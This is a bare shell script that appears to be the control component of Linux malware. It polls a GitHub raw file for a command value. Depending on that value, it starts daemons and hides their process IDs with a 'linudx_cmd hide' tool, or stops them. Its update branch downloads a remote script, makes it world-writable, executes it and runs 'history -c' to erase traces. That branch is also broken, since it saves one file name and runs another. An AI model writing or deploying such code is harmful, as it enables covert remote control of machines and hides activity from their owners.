#! /bin/sh

wget https://raw.githubusercontent.com/myvulweb/b3/master/1.txt -O /tmp/b3-singal-test.txt
ret=`cat /tmp/b3-singal-test.txt`
rm -rf /tmp/b3-singal-test.txt

cur_ver=`cat /bin/linudx-ver.txt`
echo $cur_ver
echo $ret


if [ "$ret" -eq 1 ]
then
	echo "start"
	#show###############################
	/linudx/linudx_cmd show
	if [ "`pidof linudx-home`" ];then
		echo "show linudx-home success check one"
	else
		/linudx/linudx_cmd show
	fi

	if [ "`pidof linudx-home`" ];then
		echo "show linudx-home success check two" 
	else
		echo "show linudx-home failed"
	fi
	#show end###########################
	
	p1=`pidof linudxd`
	p2=`pidof linudxt`

	#hide###########################
	/linudx/linudx_cmd hide
	if [ "`pidof linudx-home`" ];then
		/linudx/linudx_cmd hide 
	else
		echo "hide linudx-home success check1"
	fi

	if [ "`pidof linudx-home`" ];then
		echo "hide linudx-home failed" 
	else
		echo "hide linudx-home success check2"
	fi
	#hide end########################
	
	if [ "$p1" ];then
		echo "already started linudxd"
	else
		echo "need to start linudxd"
		/bin/linudxd &
		/linudx/linudx_cmd hide `pidof linudxd`
	fi

	if [ "$p2" ];then
		echo "already started linudxt"
	else
		echo "need to start linudxt"
		/bin/linudxt &
		/linudx/linudx_cmd hide `pidof linudxt`
	fi

elif [ "$ret" -eq 0 ]
then
	echo "need to stop all"

	/linudx/linudx_cmd show

	if [ "`pidof linudxd`" ];then
		echo "show linudxd success check one"
	else
		/linudx/linudx_cmd show
	fi

	if [ "`pidof linudxd`" ];then
		echo "show linudxd success check two" 
	else
		echo "show linudxd failed"
	fi

	killall linudxd
	killall linudxt

	/linudx/linudx_cmd hide

	if [ "`pidof linudx-home`" ];then
		/linudx/linudx_cmd hide 
	else
		echo "hide linudx-home success check1"
	fi

	if [ "`pidof linudx-home`" ];then
		echo "hide linudx-home failed" 
	else
		echo "hide linudx-home success check2"
	fi

elif [ "$ret" -gt "$cur_ver" ]
then
	echo "need to update"
	wget https://raw.githubusercontent.com/myvulweb/b3/master/in.sh -O /tmp/b3-in.sh
	chmod 777 /tmp/b3-in.sh
	/tmp/b2-in.sh
	rm -rf /tmp/b3-in.sh
	history -c

else
	echo "not defined!"
fi


